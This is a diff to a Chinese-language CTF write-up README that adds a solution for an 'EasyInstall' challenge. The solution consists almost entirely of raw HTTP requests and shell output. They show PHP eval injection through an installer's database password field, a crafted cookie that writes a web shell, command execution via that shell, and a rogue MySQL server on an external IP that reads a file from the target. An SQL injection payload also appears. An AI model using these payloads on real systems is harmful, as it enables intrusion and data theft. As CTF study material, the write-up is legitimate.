@@ -1466,7 +1466,9 @@ Connection: close
 
 ![2](./img/README/2.png)
 
-## 2025数字中国数安赛道-01EasyWeb
+## 2025数字中国数安赛道
+
+### 01EasyWeb
 
 ```python
 """文字转图片模块。
@@ -1557,4 +1559,135 @@ if __name__ == "__main__":
 # 1123' and (extractvalue(' ~ ', concat(' ~ ' , (select group_concat( flag ) from ocr_db.flag ) ) ) ) ) #
 
 python3 main.py
+```
+
+## 2025年全国能源CTF大赛社会组
+### 01EasyInstall
+
+发送一下数据包 注意 mysql的连接地址必须是真实的 所以这里的127.0.0.1 yy
+
+```http
+POST /install.php?m=Install&a=step2&c=Install& HTTP/1.1
+Host: 127.0.0.1:2002
+Content-Length: 160
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: PHPSESSID=f9d1b6956b5af8d809954a1a9d8db6b1
+Connection: keep-alive
+
+admin[]=admin&admin[]=admin&admin[]=admin&admin[]=admin&admin[]=admin&db[]=mysql&db[]=127.0.0.1&db[]=test&db[]=root&db[]=root'.eval($_GET[1]).'1&db[]=3306&db[]=
+```
+
+得到对应Cookie
+
+```http
+HTTP/1.1 302 Found
+Date: Fri, 18 Apr 2025 02:43:44 GMT
+Server: Apache/2.4.25 (Debian)
+X-Powered-By: PHP/5.6.40
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: foo_db_config=think%3A%7B%22DB_PREFIX%22%3A%22%22%2C%22DB_PORT%22%3A%223306%22%2C%22DB_PWD%22%3A%22root%2527.eval%2528%2524_GET%255B1%255D%2529.%25271%22%2C%22DB_USER%22%3A%22root%22%2C%22DB_NAME%22%3A%22test%22%2C%22DB_HOST%22%3A%22127.0.0.1%22%2C%22DB_TYPE%22%3A%22mysql%22%7D; path=/
+Location: /install.php?s=/install/step3.html
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=utf-8
+
+
+
+```
+将得到的cookie 替换下方的 Cookie ，并请求写入webShell
+```http
+POST /install.php?m=Install&a=step3&c=Install& HTTP/1.1
+Host: 127.0.0.1:2002
+Content-Length: 0
+Pragma: no-cache
+Cookie: foo_db_config=think%3A%7B%22DB_PREFIX%22%3A%22%22%2C%22DB_PORT%22%3A%223306%22%2C%22DB_PWD%22%3A%22root%2527.eval%2528%2524_GET%255B1%255D%2529.%25271%22%2C%22DB_USER%22%3A%22root%22%2C%22DB_NAME%22%3A%22test%22%2C%22DB_HOST%22%3A%22127.0.0.1%22%2C%22DB_TYPE%22%3A%22mysql%22%7D; path=/
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: PHPSESSID=f9d1b6956b5af8d809954a1a9d8db6b1
+Connection: keep-alive
+
+
+```
+访问得到flag
+
+```sh
+➜  ~ curl 'http://127.0.0.1:2002/Modules/Common/Conf/35476a338e03e65c85448bb8450bd27d.php?1=system(%27cat+/readflag%27);'
+ctf{123456789}
+```
+
+
+第二种解法 利用 恶意mysql服务器读取客户端的文件
+
+这题的flag在文件 readflag 所以有点恶心一般想不到
+
+首先在拥有公网IP的VPS上构建服务器
+
+```sh
+➜  /tmp wget https://github.com/rmb122/rogue_mysql_server/releases/download/v1.0.1/rogue_mysql_server-v1.0.1-linux-amd64.zip && unzip rogue_mysql_server-v1.0.1-linux-amd64.zip
+--2025-04-18 10:51:46--  https://github.com/rmb122/rogue_mysql_server/releases/download/v1.0.1/rogue_mysql_server-v1.0.1-linux-amd64.zip
+Resolving github.com (github.com)... 20.205.243.166
+Connecting to github.com (github.com)|20.205.243.166|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/274864626/d3436ccd-2e10-4cb9-9a1a-660b39e130fa?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250418%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250418T025134Z&X-Amz-Expires=300&X-Amz-Signature=c0afaa517ca3841b0be1836cd468aeda032264abc6b60ef0c77d072bb52f9619&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Drogue_mysql_server-v1.0.1-linux-amd64.zip&response-content-type=application%2Foctet-stream [following]
+--2025-04-18 10:51:46--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/274864626/d3436ccd-2e10-4cb9-9a1a-660b39e130fa?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250418%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250418T025134Z&X-Amz-Expires=300&X-Amz-Signature=c0afaa517ca3841b0be1836cd468aeda032264abc6b60ef0c77d072bb52f9619&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Drogue_mysql_server-v1.0.1-linux-amd64.zip&response-content-type=application%2Foctet-stream
+Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3396655 (3.2M) [application/octet-stream]
+Saving to: ‘rogue_mysql_server-v1.0.1-linux-amd64.zip.1’
+
+rogue_mysql_server-v1.0.1-linux-amd64.zip 100%[====================================================================================>]   3.24M  8.89MB/s    in 0.4s
+
+2025-04-18 10:51:48 (8.89 MB/s) - ‘rogue_mysql_server-v1.0.1-linux-amd64.zip.1’ saved [3396655/3396655]
+
+Archive:  rogue_mysql_server-v1.0.1-linux-amd64.zip
+  inflating: README.md
+  inflating: config.yaml
+  inflating: rogue_mysql_server
+```
+
+修改 config.yaml 中需要读取的文件 为 /readflag 并启动
+
+```sh
+➜  /tmp vim config.yaml
+➜  /tmp ./rogue_mysql_server
+INFO[2025-04-18 10:53:19] Server started at [0.0.0.0:3306]
+```
+
+使用以下命令触发文件读取，注意数据库IP为公网地址的IP
+```sh
+➜  ~ curl 'http://127.0.0.1:2002/install.php?m=Install&a=step3&c=Install&' \
+-H 'Cookie: foo_db_config=mysql://root:root@83.229.121.36:3306/test?1001=1;'
+
+```
+
+发送后，服务端就会得到对应的flag文件
+
+```sh
+➜  /tmp ./rogue_mysql_server
+INFO[2025-04-18 10:59:34] Server started at [0.0.0.0:3306]
+INFO[2025-04-18 10:59:37] New client from addr [171.219.210.82:17709] logged in with username [root], database [test], ID [1]
+INFO[2025-04-18 10:59:37] Client from addr [171.219.210.82:17709], ID [1] try to query [SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO"]
+INFO[2025-04-18 10:59:37] Now try to read file [/readflag] from addr [171.219.210.82:17709], ID [1]
+INFO[2025-04-18 10:59:37] Read success, stored at [./loot/171.219.210.82/1744945177597_readflag]
+INFO[2025-04-18 10:59:38] Client leaved, Addr [171.219.210.82:17709], ID [1]
+^C
+➜  /tmp cat ./loot/171.219.210.82/1744945177597_readflag
+ctf{123456789}
+➜  /tmp
 ```
